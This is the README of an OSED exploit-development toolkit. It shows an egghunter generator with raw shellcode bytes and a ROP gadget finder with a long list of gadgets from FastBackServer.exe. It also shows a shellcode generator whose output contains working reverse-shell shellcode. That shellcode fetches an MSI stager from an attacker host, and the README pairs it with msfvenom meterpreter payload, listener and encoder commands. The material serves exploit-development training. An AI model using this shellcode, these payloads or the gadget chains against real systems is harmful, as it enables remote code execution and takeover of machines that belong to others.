# osed-scripts
bespoke tooling for offensive security's Windows Usermode Exploit Dev course (OSED)

## Table of Contents

- [Standalone Scripts](#standalone-scripts)
    - [egghunter.py](#egghunterpy)
    - [find-gadgets.py](#find-gadgetspy)
    - [shellcoder.py](#shellcoderpy)
    - [install-mona.sh](#install-monash)
- [WinDbg Scripts](#windbg-scripts)
    - [find-ppr.py](#find-pprpy)

## Standalone Scripts

### egghunter.py

requires [keystone-engine](https://github.com/keystone-engine/keystone)

```
usage: egghunter.py [-h] [-t TAG] [-b BAD_CHARS [BAD_CHARS ...]] [-s]

Creates an egghunter compatible with the OSED lab VM

optional arguments:
  -h, --help            show this help message and exit
  -t TAG, --tag TAG     tag for which the egghunter will search (default: c0d3)
  -b BAD_CHARS [BAD_CHARS ...], --bad-chars BAD_CHARS [BAD_CHARS ...]
                        space separated list of bad chars to check for in final egghunter (default: 00)
  -s, --seh             create an seh based egghunter instead of NtAccessCheckAndAuditAlarm

```                        

generate default egghunter
```
./egghunter.py 
[+] egghunter created!
[=]   len: 35 bytes
[=]   tag: c0d3c0d3
[=]   ver: NtAccessCheckAndAuditAlarm

egghunter = b"\x66\x81\xca\xff\x0f\x42\x52\x31\xc0\x66\x05\xc6\x01\xcd\x2e\x3c\x05\x5a\x74\xec\xb8\x63\x30\x64\x33\x89\xd7\xaf\x75\xe7\xaf\x75\xe4\xff\xe7"

```

generate egghunter with `w00tw00t` tag
```
./egghunter.py --tag w00t
[+] egghunter created!
[=]   len: 35 bytes
[=]   tag: w00tw00t
[=]   ver: NtAccessCheckAndAuditAlarm

egghunter = b"\x66\x81\xca\xff\x0f\x42\x52\x31\xc0\x66\x05\xc6\x01\xcd\x2e\x3c\x05\x5a\x74\xec\xb8\x77\x30\x30\x74\x89\xd7\xaf\x75\xe7\xaf\x75\xe4\xff\xe7"

```

generate SEH-based egghunter while checking for bad characters (does not alter the shellcode, that's to be done manually)
```
./egghunter.py -b 00 0a 25 26 3d --seh
[+] egghunter created!
[=]   len: 69 bytes
[=]   tag: c0d3c0d3
[=]   ver: SEH

egghunter = b"\xeb\x2a\x59\xb8\x63\x30\x64\x33\x51\x6a\xff\x31\xdb\x64\x89\x23\x83\xe9\x04\x83\xc3\x04\x64\x89\x0b\x6a\x02\x59\x89\xdf\xf3\xaf\x75\x07\xff\xe7\x66\x81\xcb\xff\x0f\x43\xeb\xed\xe8\xd1\xff\xff\xff\x6a\x0c\x59\x8b\x04\x0c\xb1\xb8\x83\x04\x08\x06\x58\x83\xc4\x10\x50\x31\xc0\xc3"

```

### find-gadgets.py

Finds and categorizes useful gadgets. Only prints to terminal the cleanest gadgets available (minimal amount of garbage between what's searched for and the final ret instruction).  All gadgets are written to a text file for further searching.

requires [rich](https://github.com/willmcgugan/rich) and [ropper](https://github.com/sashs/Ropper)

```text
usage: find-gadgets.py [-h] -f FILES [FILES ...] [-b BAD_CHARS [BAD_CHARS ...]] [-o OUTPUT]

Searches for clean, categorized gadgets from a given list of files

optional arguments:
  -h, --help            show this help message and exit
  -f FILES [FILES ...], --files FILES [FILES ...]
                        space separated list of files from which to pull gadgets (optionally, add base address (libspp.dll:0x10000000))
  -b BAD_CHARS [BAD_CHARS ...], --bad-chars BAD_CHARS [BAD_CHARS ...]
                        space separated list of bad chars to omit from gadgets (default: 00)
  -o OUTPUT, --output OUTPUT
                        name of output file where all (uncategorized) gadgets are written (default: found-gadgets.txt)
```

find gadgets in multiple files (one is loaded at a different offset than what the dll prefers) and omit `0x00` and `0xde` from all gadgets

```text
./find-gadgets.py -f libeay32IBM019.dll:0x10100000 FastBackServer.exe -b 0a 0d

[+] Categorized gadgets :: ../osed-scripts/find-gadgets.py -f libeay32IBM019.dll:0x10100000 FastBackServer.exe -b 0a 0d                                         
├── write-what-where gadgets                                       
│   ├── 0x10201f7e: mov dword ptr , ecx; ret;  :: libeay32IBM019.dll                                                                                         
│   ├── 0x1020200e: mov dword ptr , edx; ret;  :: libeay32IBM019.dll                                                                                         
│   ├── 0x10284b68: mov dword ptr , eax; ret;  :: libeay32IBM019.dll                                                                                         
│   ├── 0x1022b8ca: mov dword ptr , edx; ret;  :: libeay32IBM019.dll                                                                                         
│   ├── 0x1028831e: mov dword ptr , eax; ret;  :: libeay32IBM019.dll                                                                                         
│   ├── 0x102533fb: mov dword ptr , ecx; ret;  :: libeay32IBM019.dll                                                                                         
│   ├── 0x102884de: mov dword ptr , eax; ret;  :: libeay32IBM019.dll                                                                                         
│   ├── 0x0066761d: mov dword ptr , ecx; ret;  :: FastBackServer.exe                                                                                         
│   ├── 0x006764c6: mov dword ptr , eax; ret;  :: FastBackServer.exe                                                                                         
│   └── 0x0067227c: mov dword ptr , ecx; ret;  :: FastBackServer.exe                                                                                         
├── pointer deref gadgets                                          
│   ├── 0x1021d4b4: mov eax, dword ptr ; ret;  :: libeay32IBM019.dll                                                                                         
│   ├── 0x102391a6: mov eax, dword ptr ; ret;  :: libeay32IBM019.dll                                                                                         
│   └── 0x00669ba4: mov eax, dword ptr ; ret;  :: FastBackServer.exe                                                                                         
├── swap register gadgets                                           
│   ├── 0x1021d023: mov eax, ecx; ret;  :: libeay32IBM019.dll                                                                                                
│   ├── 0x10235991: mov eax, edx; ret;  :: libeay32IBM019.dll                                                                                                
│   ├── 0x0066ab4e: mov eax, edx; ret;  :: FastBackServer.exe                                                                                                
│   ├── 0x1025328e: xchg eax, ebp; ret 0x189;  :: libeay32IBM019.dll                                                              
│   ├── 0x10201f65: xchg eax, ebp; ret 0x234a;  :: libeay32IBM019.dll                                                             
│   ├── 0x1023598b: xchg eax, ebp; ret 0x4689;  :: libeay32IBM019.dll                                                             
│   ├── 0x1021d500: xchg eax, ebp; ret 0x46c7;  :: libeay32IBM019.dll                                                             
│   ├── 0x1024832f: xchg eax, ebp; ret 0x814a;  :: libeay32IBM019.dll                                                             
│   ├── 0x1023c819: xchg eax, ebp; ret 0xca2b;  :: libeay32IBM019.dll                                                             
│   ├── 0x10221b57: xchg eax, ebp; ret 0xffff;  :: libeay32IBM019.dll                                                             
│   ├── 0x102773aa: xchg eax, edx; ret 0xfffc;  :: libeay32IBM019.dll                                                             
│   ├── 0x10225746: xchg eax, edx; ret 6;  :: libeay32IBM019.dll                                                                  
│   ├── 0x10221a5a: xchg eax, edx; ret;  :: libeay32IBM019.dll                                                                                               
│   ├── 0x10267e70: xchg eax, esp; ret 0x5489;  :: libeay32IBM019.dll                                                             
│   ├── 0x102517c7: xchg eax, esp; ret 0x8b5e;  :: libeay32IBM019.dll                                                             
│   ├── 0x10288e3f: xchg eax, esp; ret 0xc28b;  :: libeay32IBM019.dll                                                             
│   ├── 0x1020ee6f: xchg eax, esp; ret 0xe383;  :: libeay32IBM019.dll                                                             
│   ├── 0x1025b774: xchg eax, esp; ret 0xfa8b;  :: libeay32IBM019.dll                                                             
│   ├── 0x1023a003: xchg eax, esp; ret;  :: libeay32IBM019.dll                                                                                               
│   ├── 0x004b789a: xchg eax, ebp; ret 0x5588;  :: FastBackServer.exe                                                             
│   ├── 0x00464a14: xchg eax, ebp; ret 0x5589;  :: FastBackServer.exe                                                             
│   ├── 0x004595fa: xchg eax, ebp; ret 0x6852;  :: FastBackServer.exe                                                             
│   ├── 0x00479cc3: xchg eax, ebp; ret 0x9589;  :: FastBackServer.exe                                                             
│   ├── 0x00524259: xchg eax, ebp; ret 0xa152;  :: FastBackServer.exe                                                             
│   ├── 0x004d78a3: xchg eax, ebp; ret 0xc283;  :: FastBackServer.exe                                                             
│   ├── 0x0066aa06: xchg eax, ebp; ret 0xc28b;  :: FastBackServer.exe                                                             
│   ├── 0x005aea1c: xchg eax, ebp; ret 0xffef;  :: FastBackServer.exe                                                             
│   ├── 0x005b0484: xchg eax, ebp; ret 0xfff7;  :: FastBackServer.exe                                                             
│   ├── 0x0062b931: xchg eax, ebp; ret 3;  :: FastBackServer.exe                                                                  
│   ├── 0x0040bb68: xchg eax, ebp; ret;  :: FastBackServer.exe                                                                                               
│   ├── 0x0067a849: xchg eax, ebx; ret 0xfffe;  :: FastBackServer.exe                                                             
│   ├── 0x005c5f0e: xchg eax, ebx; ret 0xffff;  :: FastBackServer.exe                                                             
│   ├── 0x0040aeeb: xchg eax, ecx; ret 0x25;  :: FastBackServer.exe                                                               
│   ├── 0x00583c51: xchg eax, ecx; ret 2;  :: FastBackServer.exe                                                                  
│   ├── 0x004164a9: xchg eax, ecx; ret;  :: FastBackServer.exe                                                                                               
│   ├── 0x004f9d19: xchg eax, edi; ret;  :: FastBackServer.exe                                                                                               
│   ├── 0x00449b16: xchg eax, edx; ret 1;  :: FastBackServer.exe                                                                  
│   ├── 0x004c409b: xchg eax, edx; ret;  :: FastBackServer.exe                                                                                               
│   ├── 0x00624f18: xchg eax, esi; ret 0xffe5;  :: FastBackServer.exe                                                             
│   ├── 0x004a311f: xchg eax, esp; ret 0x458b;  :: FastBackServer.exe                                                             
│   ├── 0x0045ac84: xchg eax, esp; ret 0x5589;  :: FastBackServer.exe                                                             
│   ├── 0x0043bdbe: xchg eax, esp; ret 0x76;  :: FastBackServer.exe                                                               
│   ├── 0x00577cbd: xchg eax, esp; ret 0x858b;  :: FastBackServer.exe                                                             
│   ├── 0x005ef9b6: xchg eax, esp; ret 0x88;  :: FastBackServer.exe                                                               
│   ├── 0x0057c2f4: xchg eax, esp; ret 0x8b52;  :: FastBackServer.exe                                                             
│   ├── 0x00457c64: xchg eax, esp; ret 0x9589;  :: FastBackServer.exe                                                             
│   ├── 0x004c253a: xchg eax, esp; ret 0x97;  :: FastBackServer.exe                                                               
│   ├── 0x0064cf16: xchg eax, esp; ret 0xc28a;  :: FastBackServer.exe                                                             
│   ├── 0x00470e3c: xchg eax, esp; ret 0xd285;  :: FastBackServer.exe                                                             
│   ├── 0x005fb5b0: xchg eax, esp; ret 0xe852;  :: FastBackServer.exe                                                             
│   ├── 0x00483aab: xchg eax, esp; ret;  :: FastBackServer.exe                                                                                               
│   ├── 0x102408dd: push eax; pop esi; ret;  :: libeay32IBM019.dll                                              
│   └── 0x102408d6: push esp; pop esi; ret;  :: libeay32IBM019.dll                                              
├── increment register gadgets                                    
│   ├── 0x1020bc79: inc eax; ret;  :: libeay32IBM019.dll                                                                                                     
│   ├── 0x10203d67: inc ebp; ret;  :: libeay32IBM019.dll                                                                                                     
│   ├── 0x1020c334: inc ebx; ret 0x1000;  :: libeay32IBM019.dll                                                                   
│   ├── 0x1028a4ea: inc ecx; ret 0x330a;  :: libeay32IBM019.dll                                                                   
│   ├── 0x10211b7c: inc ecx; ret 0x8108;  :: libeay32IBM019.dll                                                                   
│   ├── 0x102054cd: inc ecx; ret 0xc11e;  :: libeay32IBM019.dll                                                                   
│   ├── 0x1021a65d: inc ecx; ret;  :: libeay32IBM019.dll                                                                                                     
│   ├── 0x1025bfa5: inc edi; ret 0xffff;  :: libeay32IBM019.dll                                                                   
│   ├── 0x10244565: inc edi; ret;  :: libeay32IBM019.dll                                                                                                     
│   ├── 0x102540da: inc edx; ret 0xfffe;  :: libeay32IBM019.dll                                                                   
│   ├── 0x10278d5a: inc edx; ret;  :: libeay32IBM019.dll                                                                                                     
│   ├── 0x102260e6: inc esi; ret 0xffff;  :: libeay32IBM019.dll                                                                   
│   ├── 0x10203e76: inc esi; ret 3;  :: libeay32IBM019.dll                                                                        
│   ├── 0x10203d98: inc esp; ret;  :: libeay32IBM019.dll                                                                                                     
│   ├── 0x005059fe: inc eax; ret 0x7d;  :: FastBackServer.exe                                                                     
│   ├── 0x005dbc70: inc eax; ret 5;  :: FastBackServer.exe                                                                        
│   ├── 0x004f268e: inc eax; ret;  :: FastBackServer.exe                                                                                                     
│   ├── 0x005c3d14: inc ebp; ret 0x4d8a;  :: FastBackServer.exe                                                                   
│   ├── 0x00671ebb: inc ebp; ret 0xc483;  :: FastBackServer.exe                                                                   
│   ├── 0x00441cfc: inc ebp; ret 0xc600;  :: FastBackServer.exe                                                                   
│   ├── 0x00671eb1: inc ebp; ret 0xe850;  :: FastBackServer.exe                                                                   
│   ├── 0x00600228: inc ebp; ret 0xffe8;  :: FastBackServer.exe                                                                   
│   ├── 0x00441d00: inc ebp; ret;  :: FastBackServer.exe                                                                                                     
│   ├── 0x0063599b: inc ecx; ret 0xffff;  :: FastBackServer.exe                                                                   
│   ├── 0x0050adf6: inc edi; ret 0xfffc;  :: FastBackServer.exe                                                                   
│   ├── 0x004b1d2f: inc edx; ret 0x17;  :: FastBackServer.exe                                                                     
│   ├── 0x005e7fcb: inc edx; ret 0xffe9;  :: FastBackServer.exe                                                                   
│   ├── 0x004fdc30: inc esi; ret 0x15;  :: FastBackServer.exe                                                                     
│   ├── 0x0048f101: inc esi; ret 0x1c;  :: FastBackServer.exe                                                                     
│   ├── 0x00618c50: inc esi; ret 0xffff;  :: FastBackServer.exe                                                                   
│   ├── 0x005cbc6a: inc esi; ret 6;  :: FastBackServer.exe                                                                        
│   ├── 0x00633b36: inc esi; ret;  :: FastBackServer.exe                                                                                                     
│   ├── 0x0052f193: inc esp; ret 0x7f;  :: FastBackServer.exe                                                                     
│   ├── 0x00422cfb: inc esp; ret 0xc160;  :: FastBackServer.exe                                                                   
│   ├── 0x004b0b84: inc esp; ret 0xfffd;  :: FastBackServer.exe                                                                   
│   └── 0x0043bdf2: inc esp; ret;  :: FastBackServer.exe                                                                                                     
├── decrement register gadgets                                     
│   ├── 0x10209f49: dec eax; ret;  :: libeay32IBM019.dll                                                                                                     
│   ├── 0x10283d5f: dec ebp; ret;  :: libeay32IBM019.dll                                                                                                     
│   ├── 0x1020c330: dec ebx; ret 0x1000;  :: libeay32IBM019.dll                                                                   
│   ├── 0x10275fd3: dec ecx; ret;  :: libeay32IBM019.dll                                                                                                     
│   ├── 0x1023797d: dec edi; ret;  :: libeay32IBM019.dll                                                                                                     
│   ├── 0x10231aa2: dec edx; ret;  :: libeay32IBM019.dll                                                                                                     
│   ├── 0x1020c32c: dec esi; ret 0x1000;  :: libeay32IBM019.dll                                                                   
│   ├── 0x1022578a: dec esi; ret 6;  :: libeay32IBM019.dll                                                                        
│   ├── 0x102665b6: dec esp; ret;  :: libeay32IBM019.dll                                                                                                     
│   ├── 0x005440ae: dec eax; ret 0x80;  :: FastBackServer.exe                                                                     
│   ├── 0x004b41e5: dec eax; ret 0xfffc;  :: FastBackServer.exe                                                                   
│   ├── 0x004f2653: dec eax; ret;  :: FastBackServer.exe                                                                                                     
│   ├── 0x004941e0: dec ebp; ret 0xfffe;  :: FastBackServer.exe                                                                   
│   ├── 0x005c3929: dec ebp; ret;  :: FastBackServer.exe                                                                                                     
│   ├── 0x004940e2: dec ebx; ret;  :: FastBackServer.exe                                                                                                     
│   ├── 0x0066c080: dec ecx; ret;  :: FastBackServer.exe                                                                                                     
│   ├── 0x005cccd8: dec edx; ret 0x5c;  :: FastBackServer.exe                                                                     
│   ├── 0x0043bdb1: dec esp; ret 0x76;  :: FastBackServer.exe                                                                     
│   ├── 0x004d3a29: dec esp; ret 0x7b;  :: FastBackServer.exe                                                                     
│   ├── 0x0052f1a4: dec esp; ret 0x7f;  :: FastBackServer.exe                                                                     
│   ├── 0x0064f551: dec esp; ret 0x8b;  :: FastBackServer.exe                                                                     
│   ├── 0x004393b4: dec esp; ret 0x8b09;  :: FastBackServer.exe                                                                   
│   └── 0x004f26d6: dec esp; ret;  :: FastBackServer.exe                                                                                                     
├── add register gadgets                                          
│   ├── 0x1021d0f0: add eax, ecx; ret;  :: libeay32IBM019.dll                                                                                                
│   ├── 0x10220478: add ebp, eax; ret 0x231;  :: libeay32IBM019.dll                                                               
│   ├── 0x005d84ec: add eax, ebp; ret 0x5f9;  :: FastBackServer.exe                                                               
│   ├── 0x005ccaec: add eax, ebp; ret 0x6b3;  :: FastBackServer.exe                                                               
│   ├── 0x0059c366: add eax, ebp; ret 0xef02;  :: FastBackServer.exe                                                              
│   ├── 0x00484a65: add eax, ebp; ret;  :: FastBackServer.exe                                                                                                
│   ├── 0x005424d2: add ebp, eax; ret 0xf1a9;  :: FastBackServer.exe                                                              
│   ├── 0x00453150: add ebp, eax; ret;  :: FastBackServer.exe                                                                                                
│   ├── 0x005aa9af: add ebx, ebp; ret;  :: FastBackServer.exe                                                                                                
│   ├── 0x00667ca3: add ecx, ecx; ret;  :: FastBackServer.exe                                                                                                
│   └── 0x006768c0: add esi, esi; ret;  :: FastBackServer.exe                                                                                                
├── subtract register gadgets                                      
│   ├── 0x1023a287: sub eax, edx; ret;  :: libeay32IBM019.dll                                                                                                
│   ├── 0x00667f1a: sub eax, ecx; ret;  :: FastBackServer.exe                                                                                                
│   ├── 0x0067b77e: sub eax, edx; ret;  :: FastBackServer.exe                                                                                                
│   └── 0x0066a121: sub esi, esi; ret;  :: FastBackServer.exe                                                                                                
├── negate register gadgets                                         
│   └── 0x1021d8c2: neg eax; ret;  :: libeay32IBM019.dll                                                                                                     
├── push gadgets                                                    
│   ├── 0x102873ec: push eax; ret 0xfffb;  :: libeay32IBM019.dll                                                                  
│   ├── 0x102122bd: push eax; ret;  :: libeay32IBM019.dll                                                                                                    
│   ├── 0x1027c29b: push ecx; ret 0;  :: libeay32IBM019.dll                                                                       
│   ├── 0x10288fcf: push ecx; ret;  :: libeay32IBM019.dll                                                                                                    
│   ├── 0x1027116a: push edx; ret;  :: libeay32IBM019.dll                                                                                                    
│   ├── 0x1020c328: push esi; ret 0x1000;  :: libeay32IBM019.dll                                                                  
│   ├── 0x1023c3b0: push esi; ret 0x1003;  :: libeay32IBM019.dll                                                                  
│   ├── 0x10276401: push esi; ret 0x7420;  :: libeay32IBM019.dll                                                                  
│   ├── 0x10276470: push esi; ret 0xf08;  :: libeay32IBM019.dll                                                                   
│   ├── 0x10206786: push esp; ret;  :: libeay32IBM019.dll                                                                                                    
│   ├── 0x005ef93d: push eax; ret 0x88;  :: FastBackServer.exe                                                                    
│   ├── 0x006093bf: push eax; ret 0x89;  :: FastBackServer.exe                                                                    
│   ├── 0x0045f642: push eax; ret;  :: FastBackServer.exe                                                                                                    
│   ├── 0x005c3920: push ebp; ret 0x458b;  :: FastBackServer.exe                                                                  
│   ├── 0x0044b059: push ebx; ret 0x21;  :: FastBackServer.exe                                                                    
│   ├── 0x00585fb5: push ebx; ret;  :: FastBackServer.exe                                                                                                    
│   ├── 0x0057dc1f: push edi; ret 0xd;  :: FastBackServer.exe                                                                     
│   ├── 0x005441d6: push edi; ret 0xfff3;  :: FastBackServer.exe                                                                  
│   ├── 0x005d67b4: push edi; ret 0xfffe;  :: FastBackServer.exe                                                                  
│   ├── 0x0066818b: push edi; ret 1;  :: FastBackServer.exe                                                                       
│   ├── 0x0050ac11: push edi; ret;  :: FastBackServer.exe                                                                                                    
│   ├── 0x004e40db: push edx; ret;  :: FastBackServer.exe                                                                                                    
│   ├── 0x0064ee1d: push esi; ret 0;  :: FastBackServer.exe                                                                       
│   ├── 0x004a8ef2: push esi; ret;  :: FastBackServer.exe                                                                                                    
│   ├── 0x00483910: push esp; ret 0x78;  :: FastBackServer.exe                                                                    
│   ├── 0x004a0219: push esp; ret 0xfffe;  :: FastBackServer.exe                                                                  
│   └── 0x0043bdff: push esp; ret;  :: FastBackServer.exe                                                                                                    
├── pop gadgets                                                    
│   ├── 0x10248d5b: pop eax; ret;  :: libeay32IBM019.dll                                                                                                     
│   ├── 0x10288b26: pop ebp; ret 0xc;  :: libeay32IBM019.dll                                                                      
│   ├── 0x10201929: pop ebp; ret;  :: libeay32IBM019.dll                                                                                                     
│   ├── 0x10288580: pop ebx; ret 0x10;  :: libeay32IBM019.dll                                                                     
│   ├── 0x1020708c: pop ebx; ret 0x3956;  :: libeay32IBM019.dll                                                                   
│   ├── 0x10201b73: pop ebx; ret;  :: libeay32IBM019.dll                                                                                                     
│   ├── 0x102010c2: pop ecx; ret;  :: libeay32IBM019.dll                                                                                                     
│   ├── 0x10201645: pop edi; ret;  :: libeay32IBM019.dll                                                                                                     
│   ├── 0x10288771: pop esi; ret 0x10;  :: libeay32IBM019.dll                                                                     
│   ├── 0x1020c324: pop esi; ret 0x1000;  :: libeay32IBM019.dll                                                                   
│   ├── 0x1023310e: pop esi; ret 0xfffe;  :: libeay32IBM019.dll                                                                   
│   ├── 0x10201535: pop esi; ret;  :: libeay32IBM019.dll                                                                                                     
│   ├── 0x10209e50: pop esp; ret 3;  :: libeay32IBM019.dll                                                                        
│   ├── 0x10204f6c: pop esp; ret;  :: libeay32IBM019.dll                                                                                                     
│   ├── 0x006777bf: pop eax; ret 4;  :: FastBackServer.exe                                                                        
│   ├── 0x0067780b: pop eax; ret 8;  :: FastBackServer.exe                                                                        
│   ├── 0x004f22f2: pop eax; ret;  :: FastBackServer.exe                                                                                                     
│   ├── 0x0040157d: pop ebp; ret 0x10;  :: FastBackServer.exe                                                                     
│   ├── 0x006230bb: pop ebp; ret 0x14;  :: FastBackServer.exe                                                                     
│   ├── 0x0064ac3b: pop ebp; ret 0x18;  :: FastBackServer.exe                                                                     
│   ├── 0x004047e7: pop ebp; ret 0x1c;  :: FastBackServer.exe                                                                     
│   ├── 0x00652aef: pop ebp; ret 0x2c;  :: FastBackServer.exe                                                                     
│   ├── 0x00679568: pop ebp; ret 0x758b;  :: FastBackServer.exe                                                                   
│   ├── 0x004017af: pop ebp; ret 0xc;  :: FastBackServer.exe                                                                      
│   ├── 0x0040115f: pop ebp; ret 4;  :: FastBackServer.exe                                                                        
│   ├── 0x0040114a: pop ebp; ret 8;  :: FastBackServer.exe                                                                        
│   ├── 0x00401015: pop ebp; ret;  :: FastBackServer.exe                                                                                                     
│   ├── 0x006673e0: pop ebx; ret 0x10;  :: FastBackServer.exe                                                                     
│   ├── 0x0067b7c4: pop ebx; ret 0xc;  :: FastBackServer.exe                                                                      
│   ├── 0x0066689e: pop ebx; ret 4;  :: FastBackServer.exe                                                                        
│   ├── 0x0066685c: pop ebx; ret;  :: FastBackServer.exe                                                                                                     
│   ├── 0x006241d4: pop ecx; ret 0xffe5;  :: FastBackServer.exe                                                                   
│   ├── 0x006662b7: pop ecx; ret;  :: FastBackServer.exe                                                                                                     
│   ├── 0x00667bc6: pop edi; ret 0x10;  :: FastBackServer.exe                                                                     
│   ├── 0x005a40ce: pop edi; ret;  :: FastBackServer.exe                                                                                                     
│   ├── 0x00460113: pop edx; ret;  :: FastBackServer.exe                                                                                                     
│   ├── 0x0067a9bc: pop esi; ret 0xc;  :: FastBackServer.exe                                                                      
│   ├── 0x0066a33a: pop esi; ret 4;  :: FastBackServer.exe                                                                        
│   ├── 0x0067a966: pop esi; ret 8;  :: FastBackServer.exe                                                                        
│   ├── 0x004f40cf: pop esi; ret;  :: FastBackServer.exe                                                                                                     
│   ├── 0x00463bdf: pop esp; ret 0x77;  :: FastBackServer.exe                                                                     
│   └── 0x004f243d: pop esp; ret;  :: FastBackServer.exe                                                                                                     
├── push-pop gadgets                                               
│   └── 0x00667f1a: sub eax, ecx; ret;  :: FastBackServer.exe                                                                                                
├── zeroize gadgets                                              
│   ├── 0x10201ba1: xor eax, eax; ret;  :: libeay32IBM019.dll                                                                                                
│   ├── 0x0067bb4a: xor eax, eax; ret 8;  :: FastBackServer.exe                                                                   
│   ├── 0x006663a5: xor eax, eax; ret;  :: FastBackServer.exe                                                                                                
│   ├── 0x1024e48f: mov eax, 0; setne al; ret;  :: libeay32IBM019.dll                                           
│   ├── 0x0067bf10: and eax, 0; mov dword ptr , ebp; lea ebp, ;                         
│   │   push eax; ret;  :: FastBackServer.exe                                                                                                                     
│   ├── 0x10258e30: xor ebx, ebx; call 0x158d60; add esp, 0xc;                          
│   │   pop ebx; ret;  :: libeay32IBM019.dll                                                                                                                       
│   ├── 0x102882e6: xor ecx, ecx; mov dword ptr , ecx; mov dword ptr , ecx;             
│   │   ret;  :: libeay32IBM019.dll           
│   ├── 0x102885ac: xor edx, edx; ret;  :: libeay32IBM019.dll                                                                                                
│   ├── 0x006672ac: xor edx, edx; ret;  :: FastBackServer.exe                                                                                                
│   ├── 0x0066de28: xor esi, esi; ret 0x7481;  :: FastBackServer.exe                                                              
│   ├── 0x0066a121: sub esi, esi; ret;  :: FastBackServer.exe                                                                                                
│   └── 0x00666df0: xor edi, edi; ret;  :: FastBackServer.exe                                                                                                
└── eip to esp gadgets                                            
    ├── 0x102889ed: leave; ret 0xc;  :: libeay32IBM019.dll                                                                                                   
    ├── 0x10287273: leave; ret;  :: libeay32IBM019.dll
    ├── 0x0066631d: leave; ret 0x10;  :: FastBackServer.exe                                                                                                  
    ├── 0x0066a4cd: leave; ret 0x14;  :: FastBackServer.exe                                                                                                  
    ├── 0x00670298: leave; ret 0xc;  :: FastBackServer.exe                                                                                                   
    ├── 0x00669403: leave; ret 4;  :: FastBackServer.exe                                                                                                     
    ├── 0x006664fd: leave; ret 8;  :: FastBackServer.exe                                                                                                     
    ├── 0x0041a708: leave; ret;  :: FastBackServer.exe
    ├── 0x10201927: mov esp, ebp; pop ebp; ret;  :: libeay32IBM019.dll                                          
    ├── 0x0040157b: mov esp, ebp; pop ebp; ret 0x10;  :: FastBackServer.exe          
    ├── 0x006230b9: mov esp, ebp; pop ebp; ret 0x14;  :: FastBackServer.exe          
    ├── 0x0064ac39: mov esp, ebp; pop ebp; ret 0x18;  :: FastBackServer.exe          
    ├── 0x004047e5: mov esp, ebp; pop ebp; ret 0x1c;  :: FastBackServer.exe          
    ├── 0x00652aed: mov esp, ebp; pop ebp; ret 0x2c;  :: FastBackServer.exe          
    ├── 0x004017ad: mov esp, ebp; pop ebp; ret 0xc;  :: FastBackServer.exe           
    ├── 0x00401190: mov esp, ebp; pop ebp; ret 4;  :: FastBackServer.exe             
    ├── 0x004016c3: mov esp, ebp; pop ebp; ret 8;  :: FastBackServer.exe             
    └── 0x00401013: mov esp, ebp; pop ebp; ret;  :: FastBackServer.exe                                          
[+] Collection of all gadgets written to found-gadgets.txt

```

### shellcoder.py

requires [keystone-engine](https://github.com/keystone-engine/keystone)

Creates reverse shell with optional msi loader

```
usage: shellcode.py [-h] [-l LHOST] [-p LPORT] [-b BAD_CHARS [BAD_CHARS ...]] [-m] [-d] [-t] [-s]

Creates shellcodes compatible with the OSED lab VM

optional arguments:
  -h, --help            show this help message and exit
  -l LHOST, --lhost LHOST
                        listening attacker system (default: 127.0.0.1)
  -p LPORT, --lport LPORT
                        listening port of the attacker system (default: 4444)
  -b BAD_CHARS [BAD_CHARS ...], --bad-chars BAD_CHARS [BAD_CHARS ...]
                        space separated list of bad chars to check for in final egghunter (default: 00)
  -m, --msi             use an msf msi exploit stager (short)
  -d, --debug-break     add a software breakpoint as the first shellcode instruction
  -t, --test-shellcode  test the shellcode on the system
  -s, --store-shellcode
                        store the shellcode in binary format in the file shellcode.bin
```

```
❯ python3 shellcode.py --msi -l 192.168.49.88 -s
[+] shellcode created! 
[=]   len:   251 bytes                                                                                            
[=]   lhost: 192.168.49.88
[=]   lport: 4444                                                                                                                                                                                                                    
[=]   break: breakpoint disabled                                                                                                                                                                                                     
[=]   ver:   MSI stager
[=]   Shellcode stored in: shellcode.bin
[=]   help:
         Create msi payload:
                 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.49.88 LPORT=443 -f msi -o X
         Start http server (hosting the msi file):
                 sudo python -m SimpleHTTPServer 4444 
         Start the metasploit listener:
                 sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.49.88; set LPORT 443; exploit"
         Remove bad chars with msfvenom (use --store-shellcode flag): 
                 cat shellcode.bin | msfvenom --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d" -f python -v shellcode

shellcode = b"\x89\xe5\x81\xc4\xf0\xf9\xff\xff\x31\xc9\x64\x8b\x71\x30\x8b\x76\x0c\x8b\x76\x1c\x8b\x5e\x08\x8b\x7e\x20\x8b\x36\x66\x39\x4f\x18\x75\xf2\xeb\x06\x5e\x89\x75\x04\xeb\x54\xe8\xf5\xff\xff\xff\x60\x8b\x43\x3c\x8b\x7c\x03\x78\x01\xdf\x8b\x4f\x18\x8b\x47\x20\x01\xd8\x89\x45\xfc\xe3\x36\x49\x8b\x45\xfc\x8b\x34\x88\x01\xde\x31\xc0\x99\xfc\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x3b\x54\x24\x24\x75\xdf\x8b\x57\x24\x01\xda\x66\x8b\x0c\x4a\x8b\x57\x1c\x01\xda\x8b\x04\x8a\x01\xd8\x89\x44\x24\x1c\x61\xc3\x68\x83\xb9\xb5\x78\xff\x55\x04\x89\x45\x10\x68\x8e\x4e\x0e\xec\xff\x55\x04\x89\x45\x14\x31\xc0\x66\xb8\x6c\x6c\x50\x68\x72\x74\x2e\x64\x68\x6d\x73\x76\x63\x54\xff\x55\x14\x89\xc3\x68\xa7\xad\x2f\x69\xff\x55\x04\x89\x45\x18\x31\xc0\x66\xb8\x71\x6e\x50\x68\x2f\x58\x20\x2f\x68\x34\x34\x34\x34\x68\x2e\x36\x34\x3a\x68\x38\x2e\x34\x39\x68\x32\x2e\x31\x36\x68\x2f\x2f\x31\x39\x68\x74\x74\x70\x3a\x68\x2f\x69\x20\x68\x68\x78\x65\x63\x20\x68\x6d\x73\x69\x65\x54\xff\x55\x18\x31\xc9\x51\x6a\xff\xff\x55\x10"           
****
```

### install-mona.sh

downloads all components necessary to install mona and prompts you to use an admin shell on the windows box to finish installation.

```
❯ ./install-mona.sh 192.168.XX.YY
[+] once the RDP window opens, execute the following command in an Administrator terminal:

powershell -c "cat \\tsclient\mona-share\install-mona.ps1 | powershell -"

[=] downloading https://github.com/corelan/windbglib/raw/master/pykd/pykd.zip
[=] downloading https://github.com/corelan/windbglib/raw/master/windbglib.py
